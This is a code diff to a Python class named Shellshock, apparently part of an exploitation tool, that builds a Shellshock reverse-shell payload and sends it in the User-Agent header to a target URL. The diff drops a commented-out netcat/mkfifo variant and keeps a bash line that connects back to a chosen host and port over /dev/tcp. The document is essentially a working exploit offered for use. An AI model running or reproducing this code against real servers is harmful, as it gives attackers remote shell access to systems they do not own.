@@ -12,19 +12,12 @@ class Shellshock():
     # exploit
     def run(self):
         print (LogColors.BLUE + "run reverse shell " + self.host + ":" + self.port + "..." + LogColors.ENDC)
-        #reverse_shell = "() { :; }; /bin/bash"
-        #reverse_shell += " -c '/bin/rm -f /tmp/f;"
-        #reverse_shell += " /usr/bin/mkfifo"
-        #reverse_shell += " /tmp/f;cat /tmp/f |"
-        #reverse_shell += " /bin/sh -i 2>&1 |"
-        #reverse_shell += " nc -l %s %s > /tmp/f'" % (self.host, self.port)
-
         reverse_shell = "() { :; }; /bin/bash -i "
         reverse_shell += '>& /dev/tcp/{}/{} 0>&1'.format(self.host, self.port)
 
         print (LogColors.YELLOW + "shell: " + reverse_shell + LogColors.ENDC)
         headers = {"User-Agent" : reverse_shell}
-        
+
         r = self.session.get(self.url, headers = headers)
         print (LogColors.YELLOW + str(r.status_code) + LogColors.ENDC)
         print (LogColors.YELLOW + r.text + LogColors.ENDC)
